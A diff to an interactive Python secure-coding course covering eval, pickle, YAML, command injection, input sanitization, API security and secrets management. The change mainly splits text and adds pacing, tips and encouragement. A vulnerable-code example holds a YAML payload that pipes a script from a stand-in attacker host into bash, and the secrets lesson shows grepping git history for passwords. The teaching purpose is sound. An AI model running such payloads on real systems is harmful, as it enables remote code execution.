@@ -11,6 +11,7 @@ from utils.display import (
     section_header, sub_header, lesson_block, code_block,
     scenario_block, why_it_matters, info, success, warning, press_enter,
     show_menu, disclaimer, hint_text, ask_yes_no, C, G, Y, R, RESET, BRIGHT, DIM,
+    pace, learning_goal, nice_work, tip,
 )
 from utils.progress import mark_lesson_complete, mark_challenge_complete
 from utils.quiz import run_quiz
@@ -24,26 +25,45 @@ def _lesson_python_vulns(progress):
     """Lesson 1: Common Python Vulnerabilities."""
     section_header("Lesson 1: Common Python Vulnerabilities")
 
+    learning_goal([
+        "Recognize dangerous Python functions (eval, pickle, yaml.load)",
+        "Understand why each one allows code execution",
+        "Know the safe alternative for each pattern",
+    ])
+
+    pace()
+
     lesson_block(
-        "Python's expressiveness and ease of use have a dark side: several "
-        "built-in features can be weaponized if used carelessly. In this lesson "
-        "we examine the most dangerous patterns and learn the safe alternatives "
-        "that every Python developer should know."
+        "Python's expressiveness has a dark side: several built-in features "
+        "can be weaponized if used carelessly."
     )
+
+    lesson_block(
+        "In this lesson we look at the most dangerous patterns and learn "
+        "the safe alternatives that every Python developer should know."
+    )
+
+    pace()
 
     # --- eval / exec ---
-    sub_header("1. eval() and exec() — Arbitrary Code Execution")
+    sub_header("1. eval() and exec() -- Arbitrary Code Execution")
 
     lesson_block(
-        "eval() takes a string and executes it as a Python expression. exec() "
-        "does the same for arbitrary statements. If untrusted input reaches "
-        "either function, the attacker can run ANY code on your system, "
-        "including deleting files, installing backdoors, or exfiltrating data."
+        "eval() takes a string and runs it as a Python expression. exec() "
+        "does the same for arbitrary statements."
     )
+
+    lesson_block(
+        "If untrusted input reaches either function, the attacker can run "
+        "ANY code on your system -- deleting files, installing backdoors, "
+        "or stealing data."
+    )
+
+    pace()
 
     info("VULNERABLE code:")
     code_block(
-        '# A \"calculator\" API endpoint — DO NOT do this\n'
+        '# A "calculator" API endpoint — DO NOT do this\n'
         'def calculate(user_input):\n'
         '    """Evaluate a math expression from the user."""\n'
         '    result = eval(user_input)  # DANGER!\n'
@@ -55,7 +75,11 @@ def _lesson_python_vulns(progress):
         "python"
     )
 
+    pace()
+
     warning("Even eval() with 'restricted' globals can be bypassed. Never use eval() on untrusted input.")
+
+    pace()
 
     info("SAFE alternative:")
     code_block(
@@ -68,8 +92,13 @@ def _lesson_python_vulns(progress):
         '    try:\n'
         '        return ast.literal_eval(user_input)\n'
         '    except (ValueError, SyntaxError):\n'
-        '        raise ValueError("Invalid input")\n'
-        '\n'
+        '        raise ValueError("Invalid input")',
+        "python"
+    )
+
+    pace()
+
+    code_block(
         '# Option 2: Build a real parser for math expressions\n'
         'ALLOWED_OPS = {\n'
         '    ast.Add: operator.add,\n'
@@ -95,18 +124,28 @@ def _lesson_python_vulns(progress):
         "python"
     )
 
+    pace()
+
+    nice_work("You now know to never use eval() on user input. That alone prevents many real attacks!")
+
     press_enter()
 
     # --- pickle ---
-    sub_header("2. pickle — Deserialization of Untrusted Data")
+    sub_header("2. pickle -- Deserialization of Untrusted Data")
 
     lesson_block(
-        "Python's pickle module can serialize and deserialize arbitrary Python "
-        "objects.  Deserializing (unpickling) untrusted data is equivalent to "
-        "running eval() on it — the attacker can execute arbitrary code by "
-        "crafting a malicious pickle payload.  This vulnerability is rated "
-        "CRITICAL by every security framework."
+        "Python's pickle module can serialize and deserialize arbitrary "
+        "objects. Deserializing (unpickling) untrusted data is equivalent "
+        "to running eval() on it."
     )
+
+    lesson_block(
+        "The attacker can execute arbitrary code by crafting a malicious "
+        "pickle payload. This vulnerability is rated CRITICAL by every "
+        "security framework."
+    )
+
+    pace()
 
     info("VULNERABLE code:")
     code_block(
@@ -127,6 +166,8 @@ def _lesson_python_vulns(progress):
         "python"
     )
 
+    pace()
+
     info("SAFE alternative:")
     code_block(
         'import json\n'
@@ -136,8 +177,13 @@ def _lesson_python_vulns(progress):
         '# Option 1: Use JSON (can only represent basic data types)\n'
         'def safe_load_session(session_json):\n'
         '    """Load session data from JSON — no code execution possible."""\n'
-        '    return json.loads(session_json)\n'
-        '\n'
+        '    return json.loads(session_json)',
+        "python"
+    )
+
+    pace()
+
+    code_block(
         '# Option 2: If you MUST use pickle, sign the data with HMAC\n'
         'SECRET_KEY = b"loaded-from-environment-variable"\n'
         '\n'
@@ -151,11 +197,15 @@ def _lesson_python_vulns(progress):
         '    expected_sig = hmac.new(SECRET_KEY, data_bytes, hashlib.sha256).hexdigest()\n'
         '    if not hmac.compare_digest(sig, expected_sig):\n'
         '        raise ValueError("Data tampered with — signature mismatch")\n'
-        '    return pickle.loads(data_bytes)  # Only safe because WE signed it\n'
-        '\n'
-        '# Best practice: avoid pickle entirely and use JSON, MessagePack,\n'
-        '# Protocol Buffers, or another safe serialization format.',
+        '    return pickle.loads(data_bytes)  # Only safe because WE signed it',
         "python"
+    )
+
+    pace()
+
+    tip(
+        "Best practice: avoid pickle entirely and use JSON, MessagePack, "
+        "Protocol Buffers, or another safe serialization format."
     )
 
     press_enter()
@@ -165,9 +215,15 @@ def _lesson_python_vulns(progress):
 
     lesson_block(
         "PyYAML's yaml.load() without a safe Loader can execute arbitrary "
-        "Python code via YAML tags like !!python/object/apply.  This has caused "
-        "real-world RCE vulnerabilities in many popular projects."
+        "Python code via YAML tags like !!python/object/apply."
     )
+
+    lesson_block(
+        "This has caused real-world remote code execution vulnerabilities "
+        "in many popular projects."
+    )
+
+    pace()
 
     info("VULNERABLE code:")
     code_block(
@@ -180,6 +236,8 @@ def _lesson_python_vulns(progress):
         '# !!python/object/apply:os.system ["curl attacker.com/shell.sh|bash"]',
         "python"
     )
+
+    pace()
 
     info("SAFE alternative:")
     code_block(
@@ -197,6 +255,10 @@ def _lesson_python_vulns(progress):
         "python"
     )
 
+    pace()
+
+    nice_work("Three down, one to go! You are building great secure coding habits.")
+
     press_enter()
 
     # --- Command injection ---
@@ -205,9 +267,15 @@ def _lesson_python_vulns(progress):
     lesson_block(
         "subprocess.run() with shell=True passes the command string through "
         "/bin/sh, which means special characters like ;, |, &&, and $() are "
-        "interpreted.  If user input is concatenated into the command string, "
-        "the attacker can inject arbitrary shell commands."
+        "interpreted."
     )
+
+    lesson_block(
+        "If user input is concatenated into the command string, the attacker "
+        "can inject arbitrary shell commands."
+    )
+
+    pace()
 
     info("VULNERABLE code:")
     code_block(
@@ -229,6 +297,8 @@ def _lesson_python_vulns(progress):
         "python"
     )
 
+    pace()
+
     info("SAFE alternative:")
     code_block(
         'import subprocess\n'
@@ -246,8 +316,13 @@ def _lesson_python_vulns(progress):
         '        capture_output=True, text=True,\n'
         '        timeout=15  # always set a timeout\n'
         '    )\n'
-        '    return result.stdout\n'
-        '\n'
+        '    return result.stdout',
+        "python"
+    )
+
+    pace()
+
+    code_block(
         '# Option 2: If you MUST use shell=True, use shlex.quote()\n'
         'def safer_ping(hostname):\n'
         '    safe_hostname = shlex.quote(hostname)\n'
@@ -261,15 +336,20 @@ def _lesson_python_vulns(progress):
         "python"
     )
 
+    pace()
+
+    tip("Remember the rule: use a LIST of arguments, not a string, when calling subprocess.")
+
     press_enter()
 
     why_it_matters(
         "These four vulnerability classes (eval, pickle, YAML, command injection) "
         "appear in real CVEs every year. In 2023, a pickle deserialization "
         "vulnerability in a popular ML library allowed attackers to execute "
-        "arbitrary code on any machine that loaded a malicious model file. "
-        "Understanding these patterns is your first line of defense."
+        "arbitrary code on any machine that loaded a malicious model file."
     )
+
+    pace()
 
     scenario_block(
         "The Calculator App",
@@ -282,6 +362,8 @@ def _lesson_python_vulns(progress):
     )
 
     press_enter()
+
+    nice_work("You just learned the four most common Python security pitfalls. Excellent work!")
 
     # --- Practice challenge ---
     sub_header("Practice Challenge: Spot the Vulnerability")
@@ -343,26 +425,41 @@ def _lesson_input_sanitization(progress):
     """Lesson 2: Input Sanitization."""
     section_header("Lesson 2: Input Sanitization")
 
+    learning_goal([
+        "Understand why whitelisting beats blacklisting",
+        "Validate types, lengths, and formats at trust boundaries",
+        "Encode output correctly for HTML, URLs, and SQL",
+    ])
+
+    pace()
+
     lesson_block(
-        "The cardinal rule of secure coding: NEVER TRUST USER INPUT.  Every "
-        "piece of data that crosses a trust boundary — HTTP requests, file "
-        "uploads, API calls, database results, even environment variables — "
-        "must be validated and sanitized before use.  This lesson teaches you "
-        "how to build a robust sanitization layer."
+        "The cardinal rule of secure coding: NEVER TRUST USER INPUT."
     )
+
+    lesson_block(
+        "Every piece of data that crosses a trust boundary -- HTTP requests, "
+        "file uploads, API calls, database results, even environment "
+        "variables -- must be validated and sanitized before use."
+    )
+
+    pace()
 
     # --- Whitelisting vs blacklisting ---
     sub_header("Whitelisting vs. Blacklisting")
 
     lesson_block(
         "BLACKLISTING (deny-list) tries to block known-bad input. This is "
-        "inherently fragile because attackers constantly find new bypass "
-        "techniques. Example: blocking '<script>' but not '<SCRIPT>' or "
-        "'<scr\\x00ipt>'.  "
-        "WHITELISTING (allow-list) defines exactly what IS allowed and rejects "
-        "everything else. This is the superior approach because it is closed "
-        "by default — unknown inputs are rejected."
+        "fragile because attackers constantly find new bypass techniques."
     )
+
+    lesson_block(
+        "WHITELISTING (allow-list) defines exactly what IS allowed and rejects "
+        "everything else. This is the better approach because unknown inputs "
+        "are rejected by default."
+    )
+
+    pace()
 
     info("WEAK (blacklist) approach:")
     code_block(
@@ -374,8 +471,13 @@ def _lesson_input_sanitization(progress):
         '    cleaned = user_input\n'
         '    for bad in BLACKLIST:\n'
         '        cleaned = cleaned.replace(bad, "")\n'
-        '    return cleaned\n'
-        '\n'
+        '    return cleaned',
+        "python"
+    )
+
+    pace()
+
+    code_block(
         '# Bypasses:\n'
         "# - URL encoding: %27 instead of '\n"
         '# - Unicode: different quote characters\n'
@@ -383,6 +485,8 @@ def _lesson_input_sanitization(progress):
         '# - Double encoding: %2527',
         "python"
     )
+
+    pace()
 
     info("STRONG (whitelist) approach:")
     code_block(
@@ -392,8 +496,13 @@ def _lesson_input_sanitization(progress):
         'USERNAME_PATTERN = re.compile(r"^[a-zA-Z0-9_]{3,30}$")\n'
         'EMAIL_PATTERN = re.compile(\n'
         '    r"^[a-zA-Z0-9._%+\\-]+@[a-zA-Z0-9.\\-]+\\.[a-zA-Z]{2,}$"\n'
-        ')\n'
-        '\n'
+        ')',
+        "python"
+    )
+
+    pace()
+
+    code_block(
         'def validate_username(username):\n'
         '    """Only allow alphanumeric characters and underscores."""\n'
         '    if not USERNAME_PATTERN.match(username):\n'
@@ -412,6 +521,10 @@ def _lesson_input_sanitization(progress):
         "python"
     )
 
+    pace()
+
+    nice_work("Whitelist over blacklist -- that single rule will save you many headaches!")
+
     press_enter()
 
     # --- Type checking ---
@@ -419,9 +532,11 @@ def _lesson_input_sanitization(progress):
 
     lesson_block(
         "Python is dynamically typed, which means a function expecting an "
-        "integer might receive a string containing malicious content.  Always "
+        "integer might receive a string with malicious content. Always "
         "enforce types at trust boundaries."
     )
+
+    pace()
 
     code_block(
         'def get_page_number(raw_input):\n'
@@ -432,8 +547,13 @@ def _lesson_input_sanitization(progress):
         '        raise ValueError("Page must be a valid integer")\n'
         '    if page < 1 or page > 10000:\n'
         '        raise ValueError("Page must be between 1 and 10000")\n'
-        '    return page\n'
-        '\n'
+        '    return page',
+        "python"
+    )
+
+    pace()
+
+    code_block(
         '# With type hints and runtime validation (using Pydantic):\n'
         'from pydantic import BaseModel, Field, validator\n'
         '\n'
@@ -449,17 +569,26 @@ def _lesson_input_sanitization(progress):
         "python"
     )
 
+    pace()
+
+    tip("Pydantic is a great library for automatic validation. It catches many input bugs for free.")
+
     press_enter()
 
     # --- Length limits ---
     sub_header("Length Limits and Size Constraints")
 
     lesson_block(
-        "Buffer overflows may be rare in Python (thanks to managed memory), but "
-        "denial-of-service via oversized input is very real.  A 10 GB JSON "
-        "payload, a 5-million-character username, or a regex applied to a very "
-        "long string (ReDoS) can crash your application."
+        "Buffer overflows may be rare in Python, but denial-of-service via "
+        "oversized input is very real."
     )
+
+    lesson_block(
+        "A 10 GB JSON payload, a 5-million-character username, or a regex "
+        "applied to a very long string (ReDoS) can crash your application."
+    )
+
+    pace()
 
     code_block(
         '# Always enforce size limits\n'
@@ -473,8 +602,13 @@ def _lesson_input_sanitization(progress):
         '            f"Request body too large: {len(body)} bytes "\n'
         '            f"(max {MAX_REQUEST_SIZE})"\n'
         '        )\n'
-        '    return body\n'
-        '\n'
+        '    return body',
+        "python"
+    )
+
+    pace()
+
+    code_block(
         'def validate_text_field(value: str, field_name: str,\n'
         '                        max_length: int = MAX_FIELD_LENGTH) -> str:\n'
         '    if len(value) > max_length:\n'
@@ -486,16 +620,20 @@ def _lesson_input_sanitization(progress):
         "python"
     )
 
+    pace()
+
     press_enter()
 
     # --- Encoding ---
     sub_header("Output Encoding")
 
     lesson_block(
-        "Input validation is half the battle. The other half is OUTPUT ENCODING "
-        "— transforming data before inserting it into a different context (HTML, "
-        "SQL, shell command, URL) so that it cannot be interpreted as code."
+        "Input validation is half the battle. The other half is OUTPUT "
+        "ENCODING -- transforming data before inserting it into a different "
+        "context (HTML, SQL, shell, URL) so it cannot be interpreted as code."
     )
+
+    pace()
 
     code_block(
         'import html\n'
@@ -509,8 +647,13 @@ def _lesson_input_sanitization(progress):
         '# URL encoding — safe for query parameters\n'
         'search_term = "cats & dogs"\n'
         'safe_url = urllib.parse.quote(search_term)\n'
-        '# Result: cats%20%26%20dogs\n'
-        '\n'
+        '# Result: cats%20%26%20dogs',
+        "python"
+    )
+
+    pace()
+
+    code_block(
         '# SQL parameterization — prevents SQL injection\n'
         'import sqlite3\n'
         'conn = sqlite3.connect(":memory:")\n'
@@ -524,6 +667,10 @@ def _lesson_input_sanitization(progress):
         "python"
     )
 
+    pace()
+
+    nice_work("You now understand both input validation AND output encoding. Strong combo!")
+
     press_enter()
 
     # --- Building a sanitization library ---
@@ -531,9 +678,11 @@ def _lesson_input_sanitization(progress):
 
     lesson_block(
         "In a real project you want a single module that all code imports for "
-        "input validation.  This centralizes your security logic so it can be "
+        "input validation. This centralizes your security logic so it can be "
         "audited, tested, and updated in one place."
     )
+
+    pace()
 
     code_block(
         '"""sanitize.py — Central input sanitization module."""\n'
@@ -551,7 +700,13 @@ def _lesson_input_sanitization(progress):
         '    if not isinstance(value, str):\n'
         '        raise ValidationError(f"Expected string, got {type(value).__name__}")\n'
         '    # Normalize Unicode to prevent homograph attacks\n'
-        '    value = unicodedata.normalize("NFKC", value)\n'
+        '    value = unicodedata.normalize("NFKC", value)',
+        "python"
+    )
+
+    pace()
+
+    code_block(
         '    # Strip control characters (keep newlines if allowed)\n'
         '    if allow_newlines:\n'
         '        value = "".join(c for c in value if c.isprintable() or c in "\\n\\r\\t")\n'
@@ -564,8 +719,13 @@ def _lesson_input_sanitization(progress):
         '\n'
         'def clean_html(value):\n'
         '    """Escape HTML entities to prevent XSS."""\n'
-        '    return html.escape(clean_string(value), quote=True)\n'
-        '\n'
+        '    return html.escape(clean_string(value), quote=True)',
+        "python"
+    )
+
+    pace()
+
+    code_block(
         'def validate_int(value, min_val=None, max_val=None):\n'
         '    """Convert to int and enforce range."""\n'
         '    try:\n'
@@ -576,8 +736,13 @@ def _lesson_input_sanitization(progress):
         '        raise ValidationError(f"Value {result} below minimum {min_val}")\n'
         '    if max_val is not None and result > max_val:\n'
         '        raise ValidationError(f"Value {result} above maximum {max_val}")\n'
-        '    return result\n'
-        '\n'
+        '    return result',
+        "python"
+    )
+
+    pace()
+
+    code_block(
         'def validate_choice(value, allowed):\n'
         '    """Ensure value is one of the allowed options."""\n'
         '    if value not in allowed:\n'
@@ -604,14 +769,20 @@ def _lesson_input_sanitization(progress):
         "python"
     )
 
+    pace()
+
+    tip("Build your sanitization library once, test it well, and reuse it everywhere.")
+
     press_enter()
 
     why_it_matters(
-        "Over 70% of web application vulnerabilities — SQL injection, XSS, "
-        "path traversal, command injection — originate from insufficient input "
-        "validation.  A centralized sanitization library is the single most "
+        "Over 70% of web application vulnerabilities -- SQL injection, XSS, "
+        "path traversal, command injection -- come from insufficient input "
+        "validation. A centralized sanitization library is the single most "
         "cost-effective security investment a development team can make."
     )
+
+    pace()
 
     scenario_block(
         "The Unicode Bypass",
@@ -680,26 +851,36 @@ def _lesson_secure_api(progress):
     """Lesson 3: Secure API Design."""
     section_header("Lesson 3: Secure API Design")
 
+    learning_goal([
+        "Add authentication (API keys, JWT, OAuth) to APIs",
+        "Implement rate limiting and CORS",
+        "Handle errors without leaking information",
+        "Enforce HTTPS and security headers",
+    ])
+
+    pace()
+
     lesson_block(
-        "APIs are the primary attack surface of modern applications.  Whether "
+        "APIs are the primary attack surface of modern applications. Whether "
         "you are building a REST API, GraphQL endpoint, or internal service, "
-        "security must be designed in from the start — not bolted on after "
-        "deployment.  This lesson covers the essential security controls every "
-        "API needs."
+        "security must be designed in from the start."
     )
+
+    pace()
 
     # --- Authentication ---
     sub_header("1. Authentication: Who Is Making This Request?")
 
     lesson_block(
         "Authentication verifies identity. There are three common approaches "
-        "for API authentication, each with different tradeoffs:"
+        "for API authentication, each with different tradeoffs."
     )
+
+    pace()
 
     lesson_block(
         "API KEYS: Simple string tokens passed in a header. Easy to implement "
-        "but hard to manage at scale. Best for server-to-server communication "
-        "where the caller is a known service, not a human user."
+        "but hard to manage at scale. Best for server-to-server communication."
     )
 
     code_block(
@@ -727,14 +908,17 @@ def _lesson_secure_api(progress):
         "python"
     )
 
+    pace()
+
     press_enter()
 
     lesson_block(
-        "JWT (JSON Web Tokens): Self-contained tokens that encode claims about "
-        "the user (user ID, roles, expiration). The server signs the token so "
-        "it can verify authenticity without a database lookup. Used extensively "
-        "for stateless authentication in web and mobile apps."
+        "JWT (JSON Web Tokens): Self-contained tokens that encode claims "
+        "about the user (user ID, roles, expiration). The server signs the "
+        "token so it can verify authenticity without a database lookup."
     )
+
+    pace()
 
     code_block(
         'import jwt\n'
@@ -754,8 +938,13 @@ def _lesson_secure_api(progress):
         '        "exp": datetime.datetime.utcnow()\n'
         '              + datetime.timedelta(hours=JWT_EXPIRATION_HOURS),\n'
         '    }\n'
-        '    return jwt.encode(payload, JWT_SECRET, algorithm=JWT_ALGORITHM)\n'
-        '\n'
+        '    return jwt.encode(payload, JWT_SECRET, algorithm=JWT_ALGORITHM)',
+        "python"
+    )
+
+    pace()
+
+    code_block(
         'def verify_token(token):\n'
         '    """Decode and verify a JWT. Raises on invalid/expired tokens."""\n'
         '    try:\n'
@@ -771,15 +960,24 @@ def _lesson_secure_api(progress):
         "python"
     )
 
+    pace()
+
+    nice_work("API keys and JWTs are the two most common auth methods you will see in practice!")
+
     press_enter()
 
     lesson_block(
         "OAUTH 2.0: A delegation protocol where users authorize third-party "
-        "apps to access their data without sharing their password.  The user "
-        "authenticates with the identity provider (Google, GitHub, etc.), which "
-        "issues an access token to the app.  Complex to implement but the "
-        "industry standard for user-facing APIs."
+        "apps to access their data without sharing their password."
     )
+
+    lesson_block(
+        "The user authenticates with the identity provider (Google, GitHub, "
+        "etc.), which issues an access token to the app. Complex to implement "
+        "but the industry standard for user-facing APIs."
+    )
+
+    pace()
 
     code_block(
         '# OAuth 2.0 flow (simplified):\n'
@@ -799,8 +997,13 @@ def _lesson_secure_api(progress):
         '#        grant_type=authorization_code&\n'
         '#        code=AUTH_CODE&\n'
         '#        client_id=YOUR_ID&\n'
-        '#        client_secret=YOUR_SECRET  # server-side only!\n'
-        '#\n'
+        '#        client_secret=YOUR_SECRET  # server-side only!',
+        "text"
+    )
+
+    pace()
+
+    code_block(
         '# 4. Use the access token to call the API:\n'
         '#    GET https://api.example.com/profile\n'
         '#    Authorization: Bearer ACCESS_TOKEN\n'
@@ -813,6 +1016,8 @@ def _lesson_secure_api(progress):
         "text"
     )
 
+    pace()
+
     press_enter()
 
     # --- Rate limiting ---
@@ -820,10 +1025,15 @@ def _lesson_secure_api(progress):
 
     lesson_block(
         "Rate limiting prevents abuse by capping the number of requests a "
-        "client can make within a time window.  Without it, attackers can "
-        "brute-force logins, scrape data, or overwhelm your service with "
-        "requests."
+        "client can make within a time window."
     )
+
+    lesson_block(
+        "Without it, attackers can brute-force logins, scrape data, or "
+        "overwhelm your service with requests."
+    )
+
+    pace()
 
     code_block(
         'import time\n'
@@ -837,8 +1047,13 @@ def _lesson_secure_api(progress):
         '    def __init__(self, max_requests=100, window_seconds=60):\n'
         '        self.max_requests = max_requests\n'
         '        self.window = window_seconds\n'
-        '        self.requests = defaultdict(list)  # ip -> [timestamps]\n'
-        '\n'
+        '        self.requests = defaultdict(list)  # ip -> [timestamps]',
+        "python"
+    )
+
+    pace()
+
+    code_block(
         '    def is_allowed(self, client_id):\n'
         '        """Check if a request from client_id is within limits."""\n'
         '        now = time.time()\n'
@@ -850,8 +1065,13 @@ def _lesson_secure_api(progress):
         '        if len(self.requests[client_id]) >= self.max_requests:\n'
         '            return False\n'
         '        self.requests[client_id].append(now)\n'
-        '        return True\n'
-        '\n'
+        '        return True',
+        "python"
+    )
+
+    pace()
+
+    code_block(
         'limiter = RateLimiter(max_requests=100, window_seconds=60)\n'
         '\n'
         'def rate_limit(f):\n'
@@ -865,17 +1085,22 @@ def _lesson_secure_api(progress):
         "python"
     )
 
+    pace()
+
+    nice_work("Rate limiting is one of the simplest and most effective API protections!")
+
     press_enter()
 
     # --- CORS ---
     sub_header("3. CORS (Cross-Origin Resource Sharing)")
 
     lesson_block(
-        "CORS controls which web pages can make requests to your API.  Without "
-        "proper CORS headers, any website could make authenticated requests to "
-        "your API using your users' cookies (the same cookies the browser "
-        "automatically includes)."
+        "CORS controls which web pages can make requests to your API. "
+        "Without proper CORS headers, any website could make authenticated "
+        "requests to your API using your users' cookies."
     )
+
+    pace()
 
     code_block(
         '# DANGEROUS — allows any website to call your API\n'
@@ -891,8 +1116,13 @@ def _lesson_secure_api(progress):
         'from flask_cors import CORS\n'
         '\n'
         'app = Flask(__name__)\n'
-        'CORS(app, origins=ALLOWED_ORIGINS, supports_credentials=True)\n'
-        '\n'
+        'CORS(app, origins=ALLOWED_ORIGINS, supports_credentials=True)',
+        "python"
+    )
+
+    pace()
+
+    code_block(
         '# Manual CORS headers (if not using flask-cors):\n'
         '@app.after_request\n'
         'def add_cors_headers(response):\n'
@@ -906,17 +1136,25 @@ def _lesson_secure_api(progress):
         "python"
     )
 
+    pace()
+
     press_enter()
 
     # --- Error handling ---
     sub_header("4. Error Handling That Does Not Leak Information")
 
     lesson_block(
-        "Error messages are a gold mine for attackers.  A stack trace reveals "
-        "file paths, library versions, and internal logic.  A detailed SQL "
-        "error reveals table names and column structures.  Your API must return "
-        "generic error messages to clients while logging full details internally."
+        "Error messages are a gold mine for attackers. A stack trace reveals "
+        "file paths, library versions, and internal logic."
     )
+
+    lesson_block(
+        "A detailed SQL error reveals table names and column structures. "
+        "Your API must return generic error messages to clients while "
+        "logging full details internally."
+    )
+
+    pace()
 
     info("DANGEROUS error handling:")
     code_block(
@@ -932,6 +1170,8 @@ def _lesson_secure_api(progress):
         '        # "error": "relation \\"users\\" column \\"password_hash\\" ...',
         "python"
     )
+
+    pace()
 
     info("SAFE error handling:")
     code_block(
@@ -950,8 +1190,13 @@ def _lesson_secure_api(progress):
         '    return jsonify({\n'
         '        "error": "An internal error occurred",\n'
         '        "error_id": error_id,  # so support can look it up\n'
-        '    }), 500\n'
-        '\n'
+        '    }), 500',
+        "python"
+    )
+
+    pace()
+
+    code_block(
         '# Specific error handlers for expected cases\n'
         '@app.errorhandler(404)\n'
         'def not_found(e):\n'
@@ -963,16 +1208,22 @@ def _lesson_secure_api(progress):
         "python"
     )
 
+    pace()
+
+    tip("Always give the client a unique error_id so support can find the full details in the logs.")
+
     press_enter()
 
     # --- HTTPS ---
     sub_header("5. HTTPS Enforcement")
 
     lesson_block(
-        "EVERY API must be served over HTTPS. HTTP transmits data in plaintext, "
-        "which means anyone on the network path can read API keys, session "
-        "tokens, and user data. In addition to TLS, set security headers:"
+        "EVERY API must be served over HTTPS. HTTP transmits data in "
+        "plaintext, which means anyone on the network path can read API "
+        "keys, session tokens, and user data."
     )
+
+    pace()
 
     code_block(
         '@app.after_request\n'
@@ -997,6 +1248,10 @@ def _lesson_secure_api(progress):
         "python"
     )
 
+    pace()
+
+    nice_work("You have covered all five pillars of secure API design!")
+
     press_enter()
 
     why_it_matters(
@@ -1006,6 +1261,8 @@ def _lesson_secure_api(progress):
         "data exposure, lack of rate limiting, and broken function-level "
         "authorization. Getting these basics right prevents most attacks."
     )
+
+    pace()
 
     scenario_block(
         "The Verbose Error Message",
@@ -1087,13 +1344,26 @@ def _lesson_secrets_management(progress):
     """Lesson 4: Secrets Management."""
     section_header("Lesson 4: Secrets Management")
 
+    learning_goal([
+        "Recognize common secrets management mistakes",
+        "Use environment variables and .env files safely",
+        "Understand dedicated secret managers (AWS, Vault)",
+        "Prevent accidental secret commits with pre-commit hooks",
+    ])
+
+    pace()
+
     lesson_block(
-        "Secrets — API keys, database passwords, JWT signing keys, encryption "
-        "keys, OAuth client secrets — are the crown jewels of your application. "
-        "If an attacker obtains them, they have the same access as your "
-        "application.  This lesson covers how to handle secrets correctly at "
-        "every stage of development and deployment."
+        "Secrets -- API keys, database passwords, JWT signing keys, "
+        "encryption keys -- are the crown jewels of your application."
     )
+
+    lesson_block(
+        "If an attacker obtains them, they have the same access as your "
+        "application. This lesson covers how to handle secrets correctly."
+    )
+
+    pace()
 
     # --- What NOT to do ---
     sub_header("What NOT to Do: The Hall of Shame")
@@ -1111,8 +1381,13 @@ def _lesson_secrets_management(progress):
         '\n'
         '# CRIME 3: Secrets in git history\n'
         '# Even if you delete the line, git remembers EVERYTHING\n'
-        '# $ git log -p | grep -i password\n'
-        '\n'
+        '# $ git log -p | grep -i password',
+        "python"
+    )
+
+    pace()
+
+    code_block(
         '# CRIME 4: Secrets in Docker images\n'
         '# ENV DB_PASSWORD=SuperSecret123!  # in Dockerfile\n'
         '# COPY .env /app/.env             # includes secrets\n'
@@ -1125,13 +1400,17 @@ def _lesson_secrets_management(progress):
         "python"
     )
 
+    pace()
+
     warning(
         "In 2024, researchers found over 10 million secrets exposed in public "
         "GitHub repositories, including AWS keys, database passwords, and "
-        "private SSH keys. GitGuardian's State of Secrets Sprawl report found "
-        "that the average Fortune 500 company has 1,000+ leaked secrets in "
-        "their public repos."
+        "private SSH keys."
     )
+
+    pace()
+
+    tip("If a secret has ever been committed to git, consider it compromised and rotate it immediately.")
 
     press_enter()
 
@@ -1139,10 +1418,12 @@ def _lesson_secrets_management(progress):
     sub_header("Level 1: Environment Variables")
 
     lesson_block(
-        "The simplest improvement over hardcoded secrets is to load them from "
-        "environment variables.  The application code never contains the secret "
-        "value, only a reference to the variable name."
+        "The simplest improvement over hardcoded secrets is to load them "
+        "from environment variables. The application code never contains "
+        "the secret value, only a reference to the variable name."
     )
+
+    pace()
 
     code_block(
         'import os\n'
@@ -1165,12 +1446,19 @@ def _lesson_secrets_management(progress):
         "python"
     )
 
+    pace()
+
     lesson_block(
-        "Pros: Simple, universally supported, keeps secrets out of code. "
-        "Cons: Environment variables can leak via /proc/self/environ, error "
-        "messages, child processes, and crash dumps. They are unencrypted in "
-        "memory and not audited."
+        "Pros: Simple, universally supported, keeps secrets out of code."
     )
+
+    lesson_block(
+        "Cons: Environment variables can leak via /proc/self/environ, error "
+        "messages, child processes, and crash dumps. They are unencrypted "
+        "in memory and not audited."
+    )
+
+    pace()
 
     press_enter()
 
@@ -1178,10 +1466,14 @@ def _lesson_secrets_management(progress):
     sub_header("Level 2: .env Files with python-dotenv")
 
     lesson_block(
-        "For local development, a .env file stores secrets outside of source "
-        "code.  The python-dotenv library loads these into environment variables "
-        "at startup.  CRITICAL: the .env file must be in .gitignore."
+        "For local development, a .env file stores secrets outside of "
+        "source code. The python-dotenv library loads these into environment "
+        "variables at startup."
     )
+
+    tip("CRITICAL: the .env file must be in .gitignore!")
+
+    pace()
 
     code_block(
         '# .env file (NEVER commit this to git!)\n'
@@ -1194,6 +1486,8 @@ def _lesson_secrets_management(progress):
         'STRIPE_API_KEY=sk-test-local-key',
         "env"
     )
+
+    pace()
 
     code_block(
         '# app.py\n'
@@ -1208,6 +1502,8 @@ def _lesson_secrets_management(progress):
         "python"
     )
 
+    pace()
+
     code_block(
         '# .gitignore — ESSENTIAL lines for secrets\n'
         '.env\n'
@@ -1221,6 +1517,10 @@ def _lesson_secrets_management(progress):
         "gitignore"
     )
 
+    pace()
+
+    nice_work("Environment variables and .env files handle most development scenarios!")
+
     press_enter()
 
     # --- Secret managers ---
@@ -1228,10 +1528,15 @@ def _lesson_secrets_management(progress):
 
     lesson_block(
         "For production systems, dedicated secret managers provide encryption "
-        "at rest, access control, audit logging, and automatic rotation. The "
-        "major cloud providers each offer one, and HashiCorp Vault is the "
-        "popular self-hosted option."
+        "at rest, access control, audit logging, and automatic rotation."
     )
+
+    lesson_block(
+        "The major cloud providers each offer one, and HashiCorp Vault is "
+        "the popular self-hosted option."
+    )
+
+    pace()
 
     code_block(
         '# AWS Secrets Manager\n'
@@ -1246,8 +1551,13 @@ def _lesson_secrets_management(progress):
         '\n'
         '# Usage:\n'
         '# db_creds = get_aws_secret("prod/database/credentials")\n'
-        '# DB_PASSWORD = db_creds["password"]\n'
-        '\n'
+        '# DB_PASSWORD = db_creds["password"]',
+        "python"
+    )
+
+    pace()
+
+    code_block(
         '# Google Cloud Secret Manager\n'
         'from google.cloud import secretmanager\n'
         '\n'
@@ -1256,8 +1566,13 @@ def _lesson_secrets_management(progress):
         '    client = secretmanager.SecretManagerServiceClient()\n'
         '    name = f"projects/{project_id}/secrets/{secret_name}/versions/{version}"\n'
         '    response = client.access_secret_version(name=name)\n'
-        '    return response.payload.data.decode("UTF-8")\n'
-        '\n'
+        '    return response.payload.data.decode("UTF-8")',
